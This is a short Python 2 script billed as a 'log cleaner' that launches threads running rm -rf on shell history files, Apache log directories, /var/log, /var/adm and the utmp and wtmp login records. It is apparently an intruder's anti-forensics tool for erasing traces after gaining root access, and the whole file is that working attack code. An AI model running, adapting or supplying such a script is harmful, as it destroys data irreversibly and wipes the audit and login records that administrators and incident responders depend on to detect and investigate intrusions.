#!/usr/bin/python
import threading
import os
from time import sleep, ctime
 
print'''
	    * * * * * Call Me for Clean a Log? * * * * *
                     * * * Here We Go !!! * * *
    '''
lt = ctime()
print '[+] Starting log cleaner at %s\n\n' %(lt)
sleep(5)
 
class output_command(threading.Thread):
    def __init__(self, command):
        threading.Thread.__init__(self)
        self.command = command
    def run(self):
        os.system(self.command)
        print "[+]log was finish to clean......\n"
 
class input_command:
    def __init__(self):
                clear_add = ["rm -rf /tmp/logs","rm -rf $HISTFILE","rm -rf /root/.ksh_history","rm -rf /root/.bash_history","rm -rf /root/.bash_logout","rm -rf /usr/local/apache/logs","rm -rf /usr/local/apache/logs","rm -rf /usr/local/apache/log","rm -rf /var/apache/logs","rm -rf /var/apache/log","rm -rf /var/run/utmp","rm -rf /var/logs","rm -rf /var/log","rm -rf /var/adm","rm -rf /etc/wtmp","rm -rf /etc/utmp"]
                for listt in clear_add:
                    try:
                      i=output_command(listt)
                      i.start()
                    except:
                      pass
 
if __name__ == "__main__":
       objCaller = input_command()
